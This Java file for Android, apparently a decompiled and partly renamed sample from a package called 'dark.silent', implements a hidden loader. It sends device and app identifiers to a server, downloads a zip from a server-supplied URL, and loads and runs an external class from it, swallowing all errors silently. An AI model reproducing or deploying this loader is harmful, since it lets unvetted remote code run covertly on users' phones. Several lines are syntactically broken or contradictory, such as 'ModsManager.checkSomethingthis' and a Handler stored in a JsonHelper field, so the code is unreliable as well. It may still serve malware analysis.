package dark.silent;

import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Handler.Callback;
import android.os.HandlerThread;
import android.os.Message;

import com.squareup.leakcanary.android.noop.BuildConfig;

import dark.silent.ns1.Config;
import dark.silent.ns1.ZipClassRunner;
import dark.silent.ns2.FileTools;
import dark.silent.ns2.HttpClient;
import dark.silent.ns2.JsonHelper;
import dark.silent.ns2.SomeHashThingy;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import org.json.JSONObject;
import org.swiftp.Defaults;

public class ModsManager {
    private static ModsManager modsManager = null;
    private static final Object OBJECT = new Object();
    private HandlerThread handlerThread;
    private JsonHelper jsonHelper;
    private ZipClassRunner zipClassRunner;
    private Config config;
    private Callback g = new Callback(this) {
        final /* synthetic */ ModsManager modsManager1;

        {
            this.modsManager1 = r1;
        }

        public final boolean handleMessage(Message msg) {
            if (this.modsManager1.zipClassRunner != null) {
                ZipClassRunner zipClassRunnerLocal2;
                if (!this.modsManager1.zipClassRunner.hasExternalClassInstance()) {
                    Config configLocal2;
                    String metaContent;
                    Config configLocal = this.modsManager1.config;
                    ZipClassRunner zipClassRunnerLocal = this.modsManager1.zipClassRunner;
                    if (zipClassRunner.hasExternalClassInstance()) {
                        try {
                            InputStream open = configLocal.context.getAssets().open("moast.zip");
                            if (open != null) {
                                FileTools.extractFileFromZip(open, configLocal.file);
                            }
                        } catch (Exception e) {
                        }
                        configLocal2 = this.modsManager1.config;
                        zipClassRunnerLocal2 = this.modsManager1.zipClassRunner;
                        metaContent = FileTools.extractFileFromZip(configLocal2.file, "meta.json");
                        if (!(metaContent == null || jsonHelper.a(metaContent) == null || !configLocal2.file.exists())) {
                            zipClassRunnerLocal2.loadAndRunExternalClass(configLocal2.context, configLocal2.file);
                        }
                    }
                    try {
                        Object buildConfigVersionName;
                        String str;
                        File file = new File(configLocal.context.getDir("tmpmof", 0), "moast.zip");
                        String fileHash = FileTools.md5(configLocal.file);
                        JSONObject jSONObject = new JSONObject();
                        jSONObject.put("app", zipClassRunnerLocal.appId);
                        jSONObject.put("app_v", ModsManager.this.config.a(configLocal.context));
                        jSONObject.put("key", zipClassRunnerLocal.appKey);
                        jSONObject.put("ch", zipClassRunnerLocal.phoneBrand);
                        jSONObject.put("secret", ModsManager.this.config.a(jSONObject.get("key") + "@" + jSONObject.get("app") + Defaults.chrootDir + jSONObject.get("ch") + "#" + jSONObject.get("app_v")));
                        String md5Hash = "md5";
                        if (fileHash == null) {
                            buildConfigVersionName = BuildConfig.VERSION_NAME;
                        } else {
                            str = fileHash;
                        }
                        jSONObject.put(md5Hash, buildConfigVersionName);
                        jSONObject.put("tz", ModsManager.this.config.b());
                        jSONObject.put("ua", ModsManager.checkSomethingthis.config.a());
                        HttpClient.HttpResponse httpResponse = HttpClient.sendPOST(new String(configLocal.url), jSONObject);
                        if (httpResponse != null && httpResponse.statusCode == 200) {
                            JSONObject jsonObject = JsonHelper.strToJson(httpResponse.content);
                            if (jsonObject != null) {
                                String urlFromJson = JsonHelper.pathFromJson(jsonObject, "url");
                                md5Hash = JsonHelper.pathFromJson(jsonObject, "md5");
                                JsonHelper.pathFromJson(jsonObject, "v");
                                JsonHelper.pathFromJson(jsonObject, "b");
                                if (!(md5Hash == null || urlFromJson == null || (fileHash != null && (fileHash == null || fileHash.compareToIgnoreCase(md5Hash) == 0)))) {
                                    //original: handlerThread.a(urlFromJson, file);
                                    HttpClient.downloadUrlToFile(urlFromJson, file);
                                    str = FileTools.md5(file);
                                    if (file.exists() && md5Hash.compareToIgnoreCase(str) == 0) {
                                        FileTools.deleteRecursive(configLocal.file);
                                        try {
                                            FileTools.copy(file, configLocal.file);
                                        } catch (IOException e2) {
                                        }
                                        FileTools.deleteRecursive(file);
                                    }
                                }
                            }
                        }
                        configLocal2 = this.modsManager1.config;
                        zipClassRunnerLocal2 = this.modsManager1.zipClassRunner;
                        metaContent = FileTools.extractFileFromZip(configLocal2.file, "meta.json");
                        zipClassRunnerLocal2.loadAndRunExternalClass(configLocal2.context, configLocal2.file);
                    } catch (Exception e3) {
                    }
                }
                zipClassRunnerLocal2 = this.modsManager1.zipClassRunner;
                Intent intent = (Intent) msg.obj;
                if (zipClassRunnerLocal2.hasExternalClassInstance()) {
                    try {
                        SomeHashThingy.a(zipClassRunnerLocal2.externalClassInstance, "wakeUp", new Class[]{Intent.class}, new Object[]{intent});
                    } catch (Exception e4) {
                    }
                }
            }
            return true;
        }
    };

    private ModsManager(Context context) {
        int i = 1;
        this.config = new Config(context.getApplicationContext());
        this.zipClassRunner = null;
        if (config.b().startsWith("00", 1)) {
            i = 0;
        }
        if (i != 0) {
            this.handlerThread = new HandlerThread("00");
            this.handlerThread.start();
            this.jsonHelper = new Handler(this.handlerThread.getLooper(), this.g);
        }
    }

    public static ModsManager get(Context context) {
        synchronized (OBJECT) {
            if (modsManager == null) {
                modsManager = new ModsManager(context);
            }
        }
        return modsManager;
    }

    public synchronized void initParams(String appId, String key, String phoneBrand) {
        if (this.zipClassRunner == null) {
            this.zipClassRunner = new ZipClassRunner(appId, key, phoneBrand);
            ZipClassRunner zipClassRunner = this.zipClassRunner;
            zipClassRunner.e = null;
            zipClassRunner.f = null;
        }
    }

    public void processIntent(Intent intent) {
        if (this.jsonHelper != null) {
            Message obtain = Message.obtain();
            obtain.obj = intent;
            this.jsonHelper.sendMessage(obtain);
        }
    }
}
